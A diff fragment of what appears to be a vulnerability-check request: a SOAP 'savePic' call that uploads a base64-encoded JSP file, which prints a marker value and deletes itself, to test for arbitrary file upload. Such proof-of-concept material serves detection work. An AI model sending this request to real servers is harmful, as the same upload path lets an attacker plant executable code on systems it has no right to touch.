@@ -29,7 +29,6 @@ Upgrade-Insecure-Requests: 1
       <pub:savePic soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
          <filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">zkimvsrr.jsp</filepath>
          <bytes xsi:type="soapenc:base64Binary" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">PCUgb3V0LnByaW50bG4oMTExKjExMSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</bytes>
-
       </pub:savePic>
    </soapenv:Body>
 </soapenv:Envelope>
